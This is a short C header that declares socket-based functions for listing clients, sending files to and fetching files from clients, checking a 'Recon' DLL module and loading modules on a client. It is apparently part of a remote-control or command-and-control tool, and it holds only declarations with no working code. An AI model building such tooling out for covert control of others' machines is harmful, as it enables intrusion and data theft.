#pragma once

int SendMessageOut(SOCKET hSocket, const char * szType, const char * szContent, DWORD dwContentLength = -1);
int AddBasicCommandsToMapFunctions();
int DBBCClientListInfoQueryC(SOCKET hSocket);
int DBBCGiveClientFileC(SOCKET hSocket, const char * szServerFileLocation,
  const char * szClientFileLocation);
int DBBCGetClientFileC(SOCKET hSocket, const char * szServerFileLocation,
  const char * szClientFileLocation);
int DBBCReconModuleStatusC(SOCKET hSocket, const char * szDllName);
int DBBCLoadClientModuleC(SOCKET hSocket, const char * szModuleName);
